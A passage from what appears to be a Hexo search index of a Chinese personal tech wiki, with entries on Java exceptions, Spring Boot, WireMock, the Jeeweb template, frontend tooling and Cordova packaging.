      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java CMS 选型</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/cms%20in%20java/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/cms%20in%20java/</url>
      
        <content type="html"><![CDATA[<h2 id="技术要求"><a href="#技术要求" class="headerlink" title="技术要求"></a>技术要求</h2><p>SpringMVC+Mybatis+freemarker/JSP</p><h2 id="通用后台快速开发方案"><a href="#通用后台快速开发方案" class="headerlink" title="通用后台快速开发方案"></a>通用后台快速开发方案</h2><ul><li><a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></li><li><a href="https://github.com/kanwangzjm/funiture" target="_blank" rel="noopener">https://github.com/kanwangzjm/funiture</a></li></ul><h2 id="成品CMS方案"><a href="#成品CMS方案" class="headerlink" title="成品CMS方案"></a>成品CMS方案</h2><ul><li><a href="http://www.tjpcms.com" target="_blank" rel="noopener">http://www.tjpcms.com</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>java 异常</title>
      <link href="/java/java/java-exception/"/>
      <url>/java/java/java-exception/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是异常和错误"><a href="#什么是异常和错误" class="headerlink" title="什么是异常和错误"></a>什么是异常和错误</h4><p>异常和错误都会阻止当前方法或作用域继续执行,但是异常最大的特点是可以被handle,<br>这是异常和错误最大的区别。</p><p>异常(exception)的例子:</p><ul><li>数据库链接失败</li><li>网络中断</li></ul><p>错误(errors)的例子:</p><ul><li>内存溢出</li><li>CPU超时</li></ul><p>异常可以被捕获然后进行处理,比如渲染错误页面。错误会导致程序直接退出或崩溃。</p><h4 id="Java-中的-Exception"><a href="#Java-中的-Exception" class="headerlink" title="Java 中的 Exception"></a>Java 中的 Exception</h4><p>Throwable 类是 Java 语言中所有错误或异常的超类（这就是一切皆可抛的东西）。它有两个子类：Error和Exception。</p><p>Error：用于指示合理的应用程序不应该试图捕获的严重问题。这种情况是很大的问题，大到你不能处理了，所以听之任之就行了，你不用管它。比如说VirtualMachineError：当 Java 虚拟机崩溃或用尽了它继续操作所需的资源时，抛出该错误。好吧，就算这个异常的存在了，那么应该何时，如何处理它呢？？交给JVM吧，没有比它更专业的了。</p><p>Exception：它指出了合理的应用程序想要捕获的条件。Exception又分为两类：一种是CheckedException，一种是UncheckedException。这两种Exception的区别主要是CheckedException需要用try…catch…显示的捕获，而UncheckedException不需要捕获。通常UncheckedException又叫做RuntimeException。《effective java》指出：对于可恢复的条件使用被检查的异常（CheckedException），对于程序错误（言外之意不可恢复，大错已经酿成）使用运行时异常（RuntimeException）。</p><p>常见的RuntimeExcepiton有IllegalArgumentException、IllegalStateException、NullPointerException、IndexOutOfBoundsException</p><h4 id="异常的捕获"><a href="#异常的捕获" class="headerlink" title="异常的捕获"></a>异常的捕获</h4><p>一个数组越界的例子</p><pre><code class="java">    try {        System.out.println(ints[4]);        System.out.println(&quot;是否还能执行&quot;);// 发生异常以后，后面的代码不能被执行    } catch (IndexOutOfBoundsException e) {        System.out.println(&quot;数组越界错误&quot;);    }    System.out.println(&quot;异常出现后&quot;);</code></pre><p><strong>catch 规则: 可以使用多个catch 一旦捕获到的类型同样的或者它的父类就停止捕获。</strong><br>根据这个经验我们都需要把特定的一样类放到前面,最后一个catch用一个基本类型来捕获。</p><p>比如 IOException 是FileNotFoundException 的父类,如果FileNotFoundException产生但是产生了其他<br>IOException的异常</p><pre><code class="java">public void readFile() {    BufferedReader reader = null;    try {        try {            reader = new BufferedReader(new InputStreamReader(                    new FileInputStream(&quot;file&quot;)));            // do some other work            // close reader        } finally {            reader.close();        }    } catch (FileNotFoundException e) {        e.printStackTrace();    } catch (IOException e) {        e.printStackTrace();    }}</code></pre><h4 id="异常链"><a href="#异常链" class="headerlink" title="异常链"></a>异常链</h4><p>丢出新的异常时避免丢失旧的异常,需要把旧的异常放入新的异常链中</p><p>c.initCause(e);</p><pre><code class="java">public class NeverCaught {    static void f() throws ExceptionB{        throw new ExceptionB(&quot;exception b&quot;);    }    static void g() throws ExceptionC {        try {            f();        } catch (ExceptionB e) {            ExceptionC c = new ExceptionC(&quot;exception a&quot;);            //异常连            c.initCause(e);            throw c;        }    }    public static void main(String[] args) {            try {                g();            } catch (ExceptionC e) {                e.printStackTrace();            }    }}/*exception.ExceptionCat exception.NeverCaught.g(NeverCaught.java:12)at exception.NeverCaught.main(NeverCaught.java:21)Caused by: exception.ExceptionBat exception.NeverCaught.f(NeverCaught.java:5)at exception.NeverCaught.g(NeverCaught.java:10)... 1 more*/</code></pre><h4 id="运行时异常和检查异常"><a href="#运行时异常和检查异常" class="headerlink" title="运行时异常和检查异常"></a>运行时异常和检查异常</h4><p>检查异常:编译时期比如处理的异常,比如FileNotFoundException,<br>比如使用try catch捕获。</p><p>运行时异常:可以不用处理,最终jvm会处理的异常。比如NullPointerException</p><h4 id="throw、throws"><a href="#throw、throws" class="headerlink" title="throw、throws"></a>throw、throws</h4><p>throws: 当我们遇到检查异常时,如果不想在方法内处理,可以加上throws关键字,然上一级方法调用者<br>检查,throws会抛出所有检查异常。</p><p>throw:在方法内部抛出一个异常。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 学习指南</title>
      <link href="/Spring/spring/Spring%20boot%20Basic/"/>
      <url>/Spring/spring/Spring%20boot%20Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Spring-boot"><a href="#什么是Spring-boot" class="headerlink" title="什么是Spring boot"></a>什么是Spring boot</h2><p>Spring boot是一个基于Spring、Spring MVC的开发框架，特点是约定大于配置，使用Jar和内嵌容器的方式运行。</p><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>Spring boot原理：<a href="http://blog.csdn.net/liaokailin/article/category/5765237" target="_blank" rel="noopener">http://blog.csdn.net/liaokailin/article/category/5765237</a></li></ul><h2 id="Spring-boot原理的个人理解"><a href="#Spring-boot原理的个人理解" class="headerlink" title="Spring boot原理的个人理解"></a>Spring boot原理的个人理解</h2><ul><li>内嵌Tomcat，使用JAR包部署，和一般java应用一致，不再使用web容器的方式编写代码</li><li>在使用Spring boot中非常不解的一件事是为什么可以直接引入包就可以使用，因为Spring boot有自动化配置的方式，常用的配置被定义在在autoconfigure这个包下，可以使用@Config注解来覆盖</li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mock工具 wiremock</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Wiremock%20for%20java/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/Wiremock%20for%20java/</url>
      
        <content type="html"><![CDATA[<p>Wiremock 是一个Java环境中的Mock工具，非常容易和Junit等单元测试框架集成。</p><h2 id="The-JUnit-4-x-Rule"><a href="#The-JUnit-4-x-Rule" class="headerlink" title="The JUnit 4.x Rule"></a>The JUnit 4.x Rule</h2><p>在JUnit4中可以使用Rule的注解，来直接启动</p><pre><code class="java">@Rulepublic WireMockRule wireMockRule = new WireMockRule(options().port(8888).httpsPort(8889));</code></pre><h2 id="standalone-模式"><a href="#standalone-模式" class="headerlink" title="standalone 模式"></a>standalone 模式</h2><p>这种模式可以使用Wiremock提供的jar运行文件直接启动。</p><blockquote><p>java -jar wiremock-standalone-2.11.0.jar</p></blockquote><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>可以使用录制模式来获取以后Mock的数据</li><li>如果遇到HTTPS需要配置certificate</li><li>更多信息查看文档 <a href="http://wiremock.org/docs/" target="_blank" rel="noopener">http://wiremock.org/docs/</a></li></ol><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><p>官网</p><p><a href="http://wiremock.org/" target="_blank" rel="noopener">http://wiremock.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Jeeweb - SpringMVC+Spring+Hibernate 项目模板</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Jeeweb%20-%20Java%20boilerplate/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/Jeeweb%20-%20Java%20boilerplate/</url>
      
        <content type="html"><![CDATA[<p>JeeWeb是一款基于SpringMVC+Spring+Hibernate的敏捷开发系统, 实际上是一个种子项目,但是用来开发CRUD项目绰绰有余了。</p><p>项目地址:<a href="https://www.oschina.net/p/jeeweb" target="_blank" rel="noopener">https://www.oschina.net/p/jeeweb</a><br>github地址:<a href="https://github.com/white-cat/jeeweb" target="_blank" rel="noopener">https://github.com/white-cat/jeeweb</a></p><p>通过学习这个项目,可以学习Java基本的基本选型和配置。<br>技术选型参考如下:</p><h2 id="JeeWeb-功能特点"><a href="#JeeWeb-功能特点" class="headerlink" title="JeeWeb 功能特点"></a>JeeWeb 功能特点</h2><ul><li>采用SpringMVC+Spring+Hibernate+Shiro+ Ehcache+Disruptor+Jquery + Boostrap + Ztree等基础前后端架构架构</li><li>采用面向声明的开发模式， 基于泛型编写极少代码即可实现复杂的数据展示、数据编辑、表单处理等功能，在不使用代码生成器的情况下，也只需要很少的代码就能实现基础的CURD操作，再配合在线开发与代码生成器的使用，更加加快了开发的进度，将J2EE的开发效率成本提高，可以将代码减少60%以上。</li><li>在线开发(通过在线配置实现一个表模型的增删改查功能，无需一行代码，支持用户自定义表单布局)</li><li>代码生成器，支持多种数据模型,根据表生成对应的Entity,Service,Dao,Controller,JSP等,增删改查功能生成直接使用</li><li>UI标签开发库，针对前端UI进行标准封装表，页面统一采用UI标签实现功能：数据datagrid,treegrid,FileInput,Editor,GridSelect等，实现JSP页面零JS，开发维护简洁高效</li><li>查询过滤器：只需前端配置，后台动态拼SQL追加查询条件；支持多种匹配方式（全匹配/模糊查询/包含查询/不匹配查询）</li><li>移动平台支持，对Bootstrap(兼容Html5)进行标准封装</li><li>国际化（支持多语言，国际化的封装为多语言做了便捷支持）</li><li>多数据源（在线配置数据源，数据源工作类封装）</li><li>数据权限：整合Shiro权限</li><li>计划任务控制（在线配置计划任务、方便计划任务的时间调整规划）</li><li>邮件发送（配置邮件模版、邮件帐号的在线配置、邮件异步发送、邮件发送日志功能统计）</li><li>短信发送（配置短信模版、短信帐号的在线配置、短信异步发送、短信发送日志功能统计、支持短信发送平台动态切换）</li><li>多种首页风格切换,支持自定义首页风格。（Inspinia风格|ACE风格）</li><li>数据统计报表：丰富的报表统计功能</li><li>支持多种浏览器: Google, 火狐, IE,360 等</li><li>支持数据库: Mysql,Oracle10g,SqlServer等</li><li>基础权限: 用户，角色，菜单权限</li><li>Web容器测试通过的有Jetty和Tomcat,Weblogic</li><li>要求JDK1.7+</li></ul><h1 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h1><p>1、后端</p><ul><li>核心框架：Spring Framework</li><li>安全框架：Apache Shiro</li><li>视图框架：Spring MVC</li><li>服务端验证：Hibernate Validator</li><li>布局框架：SiteMesh</li><li>任务调度：Quartz</li><li>持久层框架：Hibernate</li><li>数据库连接池：Alibaba Druid</li><li>缓存框架：Ehcache</li><li>并发框架：Disruptor</li><li>日志管理：SLF4J、Log4j</li><li>工具类：Apache Commons、Jackson、Xstream、</li></ul><p>2、前端</p><ul><li>JS框架：jQuery。</li><li>CSS框架：Twitter Bootstrap</li><li>客户端验证：Validform。</li><li>富文本在线编辑：markdown、simditor、Summernote、CodeMirror自由切换</li><li>文件上传工具:Bootstrap fileinput</li><li>数据表格：jqGrid</li><li>对话框：layer</li><li>树结构控件：jQuery zTree</li><li>日期控件： datepicker</li><li>代码高亮： syntaxhighlighter</li></ul><h2 id="简单使用说明"><a href="#简单使用说明" class="headerlink" title="简单使用说明"></a>简单使用说明</h2><ul><li>导入sql/jeeweb-mysql-v1.0.sql文件到mysql数据库</li><li>导入项目到Eclipse.</li><li>修改数据库配置文件dbconfig.properties中的账号密码.</li><li>启动项目,管理员账号admin/密码123456</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 学习教程资源收集</title>
      <link href="/java/java/Java%20tutorial%20collection/"/>
      <url>/java/java/Java%20tutorial%20collection/</url>
      
        <content type="html"><![CDATA[<h3 id="教程列表"><a href="#教程列表" class="headerlink" title="教程列表"></a>教程列表</h3><p>下列顺序可以作为学习路线图</p><ul><li>入门教程 <a href="http://www.runoob.com/java/java-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-tutorial.html</a></li><li>Servlet <a href="http://www.runoob.com/servlet/servlet-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/servlet/servlet-tutorial.html</a></li><li>JSP <a href="http://www.runoob.com/jsp/jsp-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/jsp/jsp-tutorial.html</a></li><li>Spring mvc<ul><li>张开涛 <a href="http://jinnianshilongnian.iteye.com/category/231099" target="_blank" rel="noopener">http://jinnianshilongnian.iteye.com/category/231099</a></li><li>传智播客视屏教程</li></ul></li><li><p>Maven <a href="https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2" target="_blank" rel="noopener">https://www.lynda.com/Maven-tutorials/Multi-Module-Build-Automation-Maven/520530-2.html?srchtrk=index%3a1%0alinktypeid%3a2%0aq%3amaven+%0apage%3a1%0as%3arelevance%0asa%3atrue%0aproducttypeid%3a2</a></p></li><li><p>Mybatis</p></li><li>Hibernate</li></ul><h3 id="其他资料收集"><a href="#其他资料收集" class="headerlink" title="其他资料收集"></a>其他资料收集</h3><ul><li>一些Java基础例子 <a href="http://www.runoob.com/java/java-examples.html" target="_blank" rel="noopener">http://www.runoob.com/java/java-examples.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web工程师知识图谱</title>
      <link href="/java/java/Java%20kills%20map/"/>
      <url>/java/java/Java%20kills%20map/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Java基础</p></li><li><p>Web开发基础知识</p><ul><li>浏览器工作原理</li><li>Servlet和JSP</li><li>HTTP协议</li><li>DNS解析原理</li><li>HTML、CSS、JS</li></ul></li><li><p>Java框架</p><ul><li>Spring、Spring MVC</li><li>Mybatis</li><li>Hibernate</li><li>Shiro\Spring security</li><li>Spring boot</li><li>JWT token认证方案</li></ul></li><li><p>常用library</p><ul><li>Google guava集合处理和常用工具</li><li>Apache commons api</li><li>Quartz计划任务处理</li><li>Jackson json处理</li><li>Selflog 日志生成</li><li>freemarker模板引擎</li><li>Apache httpcomponent HTTP client工具</li></ul></li><li><p>数据库</p><ul><li>Mysql</li><li>MongoDB</li><li>Redis</li></ul></li><li><p>架构设计</p><ul><li>OAuth</li><li>Restful API设计</li><li>SSO单点登录</li><li>分布式框架Dubbo</li><li>微服务框架Spring cloud</li></ul></li><li><p>工程化</p><ul><li>Gradle\Maven构建工具</li><li>Jenkins</li><li>Circleci PaaS平台的CI</li><li>Checkstyle代码质量检测</li><li>FindBugs代码检测</li><li>Swagger文档管理</li><li>Axway webgate网关方案</li></ul></li><li><p>测试</p><ul><li>Contract 测试Pact</li><li>Junit</li><li>Assertj断言库</li><li>mockito 单元测试Mock工具</li><li>WireMock数据拦截和模拟</li></ul></li><li><p>部署和监控</p><ul><li>Linux</li><li>Tomcat web服务器</li><li>Nginx负载均衡</li><li>Splunk日志管理</li><li>Dynatrace</li><li>ELK(ElasticSearch+Logstash+ Kibana)</li><li>Spring boot admin监控</li></ul></li><li><p>项目管理</p><ul><li>禅道管理平台</li><li>Trello看板管理</li><li>Confluence文档管理</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用Java构建API的知识体系</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/simple-api-archtecture/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/simple-api-archtecture/</url>
      
        <content type="html"><![CDATA[<ul><li>API基本概念及资源的定义</li><li>RESTful架构风格与成熟度模型</li><li>规范化接口定义与设计</li><li>JSON API Spec</li><li>初始化项目环境并启动一个API Demo</li><li>用Spring Boot快速构建项目</li><li>Swagger UI对API文档化</li><li>搭建多个不同业务的APIs</li><li>API升级及版本控制策略</li><li>API的认证与授权（常用的API认证方法及安全问题）</li><li>Axway网关集成及流量控制</li><li>服务负载均衡ELB/F5</li><li>Hyxtrix故障熔断器，阻止故障雪崩</li><li>API中使用RxJava进行响应式编程</li><li>最佳实践及总结</li><li>日志监控与错误追踪</li><li>调用链跟踪和性能面板</li><li>Dynatrace &amp; Zipkin</li><li>AH Portal &amp; Splunk</li><li>什么是消费者契约测试？</li><li>契约测试工具Pact的使用</li><li>Spring Cloud Contract的使用？</li><li>API测试工具的使用（SoapUI/Postman/自动化测试）</li><li>Spring Cloud 理念</li><li>配置服务器应用</li><li>API服务注册与发现</li><li>GraphQL?</li><li>遗留系统向微服务架构迁移</li><li>最佳实践</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>wiki 使用方法</title>
      <link href="/help/how-to-use-this-wiki/"/>
      <url>/help/how-to-use-this-wiki/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-hexo"><a href="#关于-hexo" class="headerlink" title="关于 hexo"></a>关于 hexo</h2><p>本 wiki 的思路为使用github作为文档、代码的版本管理,使用 hexo 来生成静态网站。摒弃了博客的写作方式,使用了 markdown 和 wiki 的方式,</p><p>从首页的导航链接直接进入所有的文档,配合搜索框一部了然,用于建立一个知识地图,因此能快速的编写和寻找需要的资料。</p><h2 id="更多-Hexo-的资料"><a href="#更多-Hexo-的资料" class="headerlink" title="更多 Hexo 的资料"></a>更多 Hexo 的资料</h2><ul><li><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a></li><li><a href="https://github.com" target="_blank" rel="noopener">Github</a></li></ul><h2 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h2><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a>图片插件</h3><p>创建文章同名目录,然后放置图片或者其他资源即可使用相对路径访问</p><p><img src="/help/how-to-use-this-wiki/05a4c81a-8793-4baa-92a1-94b28aece873.jpg" alt=""></p><p><a href="hello-world.md">测试连接</a></p><h2 id="常用-markdown-语法"><a href="#常用-markdown-语法" class="headerlink" title="常用 markdown 语法"></a>常用 markdown 语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><pre><code># 一级标题## 二级标题### 三级标题##### 四级标题###### 五级标题###### 六级标题</code></pre><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><pre><code>- Red- Green- Blue* Red* Green* Blue+ Red+ Green+ Blue</code></pre><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><pre><code>&gt; 这是一个引用</code></pre><h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><pre><code>图片：![]()    ![图片文本(可忽略)](图片地址)链接：[]()     [链接文本](链接地址)</code></pre><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>| 标题            |      标题       |            标题 || :-------------- | :-------------: | --------------: || 居左测试文本    |  居中测试文本   |    居右测试文本 || 居左测试文本1   |  居中测试文本2  |   居右测试文本3 || 居左测试文本11  | 居中测试文本22  |  居右测试文本33 || 居左测试文本111 | 居中测试文本222 | 居右测试文本333 |</code></pre><h2 id="参考其他大神博客"><a href="#参考其他大神博客" class="headerlink" title="参考其他大神博客"></a>参考其他大神博客</h2><ul><li>kailing  Java/PHP/前端，他是走实用路线的，创办了自己的技术公司 <a href="http://www.kailing.pub/index/index.html" target="_blank" rel="noopener">http://www.kailing.pub/index/index.html</a></li><li>分析了 Spring、NIO 等很多源码 <a href="https://www.javadoop.com/" target="_blank" rel="noopener">https://www.javadoop.com/</a></li><li>擅长 Java 和大数据相关的博主 <a href="https://blog.csdn.net/vbirdbest" target="_blank" rel="noopener">https://blog.csdn.net/vbirdbest</a></li><li>擅长 java、运维、大数据的博主，非常擅长收藏 <a href="https://www.cnblogs.com/jpfss/" target="_blank" rel="noopener">https://www.cnblogs.com/jpfss/</a></li><li>擅长高并发和 GC 调优、MySQL、网络、微服务  <a href="https://www.cnblogs.com/duanxz" target="_blank" rel="noopener">https://www.cnblogs.com/duanxz</a></li><li>一个年轻的兄弟，擅长微服务 <a href="https://www.cnblogs.com/sxdcgaq8080/p/12525626.html" target="_blank" rel="noopener">https://www.cnblogs.com/sxdcgaq8080/p/12525626.html</a></li><li>一位大神谈学习 <a href="https://www.cnblogs.com/maowang1991/p/3572377.html#4284615" target="_blank" rel="noopener">https://www.cnblogs.com/maowang1991/p/3572377.html#4284615</a></li><li>一个 Java 后端作者的笔记，适合 Java 中级看 <a href="https://www.cnblogs.com/wangdaijun/" target="_blank" rel="noopener">https://www.cnblogs.com/wangdaijun/</a></li><li>一位大数据相关的博主，对 linux 研究非常到位 <a href="https://www.cnblogs.com/felixzh/" target="_blank" rel="noopener">https://www.cnblogs.com/felixzh/</a></li><li>一位硕士学历的博主，对计算机科学很有研究 <a href="https://nezha.github.io/" target="_blank" rel="noopener">https://nezha.github.io/</a></li><li>使用 java 完成的各种 demo <a href="https://github.com/nezha/java-learning-demo" target="_blank" rel="noopener">https://github.com/nezha/java-learning-demo</a></li><li>Rogn 计算机基础知识非常扎实，对数据结构和算法有深入研究 <a href="https://www.cnblogs.com/lfri/p/9991925.html" target="_blank" rel="noopener">https://www.cnblogs.com/lfri/p/9991925.html</a></li><li>程序员吴师兄，博客的 UI 非常值得参考 <a href="https://www.cxyxiaowu.com/10830.html" target="_blank" rel="noopener">https://www.cxyxiaowu.com/10830.html</a></li><li>3y 大神的文章 <a href="https://github.com/ZhongFuCheng3y/3y" target="_blank" rel="noopener">https://github.com/ZhongFuCheng3y/3y</a></li><li>Java 全栈知识体系的作者 <a href="https://www.pdai.tech/" target="_blank" rel="noopener">https://www.pdai.tech/</a></li><li>高中学历，计算机基础扎实 <a href="https://github.com/woai3c" target="_blank" rel="noopener">https://github.com/woai3c</a></li><li>该作者的设计风格极好，适合模仿 <a href="https://drawcode.mdnice.com/" target="_blank" rel="noopener">https://drawcode.mdnice.com/</a></li></ul><h2 id="优秀的人"><a href="#优秀的人" class="headerlink" title="优秀的人"></a>优秀的人</h2><ul><li><p><a href="http://zihua.li/pages/about" target="_blank" rel="noopener">http://zihua.li/pages/about</a></p></li><li><p><a href="https://github.com/walkor" target="_blank" rel="noopener">https://github.com/walkor</a></p></li><li><p><a href="https://github.com/guanpengchn?tab=overview&amp;from=2020-07-01&amp;to=2020-07-17" target="_blank" rel="noopener">https://github.com/guanpengchn?tab=overview&amp;from=2020-07-01&amp;to=2020-07-17</a></p></li></ul><h2 id="我的策略"><a href="#我的策略" class="headerlink" title="我的策略"></a>我的策略</h2><p>统一 IP，单点突破，体系化。先从小册写起，不要被信息淹没。</p>]]></content>
      
      
      <categories>
          
          <category> help </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端生态图谱</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20ecologies/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20ecologies/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li>开发模式<ul><li>多页面开发 前端开发人员切页面然后和后端开发语言模板系统集成比如（PHP、JSP、EJS、JADE），后端进行渲染，前后端不分离，输出为JS、HTML、CSS等，前端开发可以对JS、CSS进行压缩或其他处理</li><li>单页面开发 使用富前端开发思想，后端只需要提供一个入口的页面和API，前端负责路由和渲染。前后端分离，前端一般会对资源进行打包，然后输出一个index.html 和 app.js,前端完成所有的业务逻辑和API调用。</li></ul></li></ul><ul><li><p>前端发展过程</p><ul><li>原生JS</li><li>JQuery + 插件开发模式，大规模的编写后台管理系统，easyUI</li><li>Backbone 的轻量级的MVC开发模式</li></ul></li><li><p>开发模式</p><ul><li><p>MVC 前端变成了一个application，index.html 入口启动, </p><ul><li>M model 一个可以操作的数据实体</li><li>V view 显示层，把数据渲染在页面上</li><li>C controller/collect 控制器</li><li>代表的框架：Backbone</li></ul></li><li><p>MVVM 解决了前端数据输入和输出映射问题</p><ul><li>M model</li><li>V 视图</li><li>MV-VM 意义是数据渲染到视图中，然后也可以从视图中获取数据，这就是双向绑定</li><li>代表框架：Angularjs </li></ul></li><li><p>单项数据流+渲染引擎</p><ul><li>React 是什么？React只是一个单项的高效的渲染引擎而已</li><li>我们讲React的时候往往在谈论React+Redux一套完整的开发生态</li><li>React/VUE</li></ul></li></ul></li><li><p>前端构建工具</p><ul><li>Node 前端开发为什么需要用Node？Node只是提供了一个JS的非浏览器运行环境（采用了chrome的V8引擎）。</li><li>Npm 一个nodejs 包管理工具和平台，NPM可以用来管理JS的依赖和包，NPM就可以安装大量的前端开发工具，NPM的描述文件为package.json<ul><li>npm install 安装当前目录下package.json 中所有的依赖</li></ul></li><li><p>构建工具</p><ul><li><p>grunt 提供了一个流处理工作环境，用来编写前端批处理任务，比如压缩JS、编译less、Sass等</p><ul><li>grunt的描述文件为Gruntfile.js</li><li>grunt的工作方式为通过编写gruntfile来组合grunt插件完成相应任务</li><li>grunt 常用插件<ul><li>requirejs 如果前端使用了模块化可以加载此类插件</li><li>uglify  </li><li>css_import 多个css组合成一个</li><li>cssmin 把css压缩成小文件</li><li>jshint 根据某种规则对JS代码检查</li></ul></li><li>一个例子项目 <a href="https://github.com/linksgo2011/backbone-weui" target="_blank" rel="noopener">https://github.com/linksgo2011/backbone-weui</a></li></ul></li><li><p>gulp 思路和grunt一致，但是gulp不仅提供了配置的方法，还可以交互式进行编程</p></li><li>webpack 资源的load和打包，webpack主要对单页面应用开发使用<ul><li>通过loader的思想，对前端资源进行管理和打包操作</li><li>Babel</li><li>Es6</li><li>Eslint</li></ul></li></ul></li></ul></li><li><p>React 生态</p><ul><li>Reactjs</li><li>React-router</li><li>Redux</li><li>React form </li><li>axios</li><li>工具<ul><li>lodash</li><li>moment</li></ul></li><li>webpack 配置</li><li>组件库 <a href="http://ant.design/" target="_blank" rel="noopener">http://ant.design/</a></li></ul></li><li><p>Vue 生态</p></li><li><p>前端的模块化历史</p><ul><li>没有模块化的时候<ul><li>命名空间放置变量作用于泄露 app.xx.fun1 = function(){}</li></ul></li><li>Requirejs</li><li>commonjs</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 Cordova打包方案</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/build-package%20with-apache-cordova/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/build-package%20with-apache-cordova/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要H5打包？"><a href="#为什么需要H5打包？" class="headerlink" title="为什么需要H5打包？"></a>为什么需要H5打包？</h2><p>通过H5可以开发跨平台的APP，比如安卓、IOS.</p><h2 id="使用Cordova打包"><a href="#使用Cordova打包" class="headerlink" title="使用Cordova打包"></a>使用Cordova打包</h2><p>使用npm安装</p><blockquote><p>npm install -g cordova</p></blockquote><p>创建一个项目</p><blockquote><p>cordova create hello com.example.hello HelloWorld</p></blockquote><p>在这个项目下有一个www的目录，该目录就是放置我们的webapp的位置</p><p>然后我们可以添加需要编译的平台</p><blockquote><p>cordova platform add ios<br>cordova platform add android</p></blockquote><p>查看添加的平台</p><blockquote><p>cordova platform ls</p></blockquote><p>构建所有平台</p><blockquote><p>cordova build</p></blockquote><p>构建指定平台</p><blockquote><p>cordova build ios</p></blockquote><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li><a href="https://cordova.apache.org/docs/en/latest/guide/cli/" target="_blank" rel="noopener">https://cordova.apache.org/docs/en/latest/guide/cli/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>H5 webapp技术选型</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/H5-webapp-tech-stack/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/H5-webapp-tech-stack/</url>
      
